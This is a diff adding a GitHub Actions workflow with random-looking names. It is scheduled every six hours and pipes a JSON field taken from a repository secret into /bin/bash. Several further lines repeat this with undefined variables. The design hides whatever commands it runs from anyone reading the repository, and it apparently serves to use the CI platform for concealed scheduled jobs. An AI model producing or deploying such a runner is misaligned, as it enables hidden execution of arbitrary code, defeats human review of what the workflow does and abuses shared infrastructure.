@@ -1,0 +1,27 @@
+name: wuyuqian9721
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wuyuqian9721
+        env:
+          anot4345: ${{ secrets.anot4345 }}
+        run: |
+          echo $anot4345 | jq -r .jkb0063 | /bin/bash
+          echo $ht2286 | jq -r .p988 | /bin/bash
+          echo $rou5339 | jq -r .qiac36338 | /bin/bash
+          echo $rfmw734 | jq -r .tj6233 | /bin/bash
+          echo $y56256 | jq -r .lg77110 | /bin/bash
+          echo $gz47 | jq -r .gk646 | /bin/bash
+          echo $ls6687 | jq -r .kglm68 | /bin/bash
+          echo $it5392 | jq -r .gbl73 | /bin/bash
+          echo $elez87250 | jq -r .yaxon07392 | /bin/bash
+
